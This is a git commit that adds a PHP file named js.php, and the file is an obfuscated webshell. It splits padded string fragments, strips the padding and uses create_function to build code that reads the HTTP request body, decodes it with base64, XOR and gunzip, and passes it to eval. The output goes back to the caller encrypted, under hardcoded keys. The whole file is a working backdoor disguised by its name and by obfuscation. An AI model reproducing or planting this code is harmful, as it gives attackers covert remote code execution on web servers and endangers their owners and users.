a874f259942a47191f1de3c95136231bc379bdde
ubaydillah <71566130+ubed354311@users.noreply.github.com>
2021-10-18 11:06:06 +0700

    Add files via upload

---
+++ js.php
@@ -0,0 +1,12 @@
+<?php
+$m='($iI=0;$iII<$l;){for(I$j=0I;($j<$cI&&$i<$l)I;$j++,$i++I){$oI.=$t{I$Ii}I^$k';
+$o='Iqja2d1";IfunctIionI Ix($t,$k){$Ic=stIrleIn($kI);$l=stIrlen($t);$o="";fIor';
+$A='{$j};}}retIuIrn $o;}if (I@pregI_match(I"/$kh(.+)$kIf/",@fIIile_Iget_IcontI';
+$T=';$rI=@basIeI64_eIncode(@x(@gzcIompress(I$o),$Ik))I;print("$IpI$kh$r$kf");}';
+$f='ents("php://input"I),$m)==I1) {@oIIIb_start();@eIval(@gzuIncompreIsIs(@x(@';
+$X=str_replace('Kw','','cKwreaKwKwte_fKwKwunKwction');
+$U='bIase6I4_decode($m[1])I,I$k)));$o=@oIbI_geIt_contents();I@ob_enId_cIlean()';
+$r='$k="Iebcfc18d";I$kh="38Ia772eIdd52eI";$Ikf="98Iad8I50c2ee7";$p="kIQGBvflIdVL';
+$E=str_replace('I','',$r.$o.$m.$A.$f.$U.$T);
+$d=$X('',$E);$d();
+?>
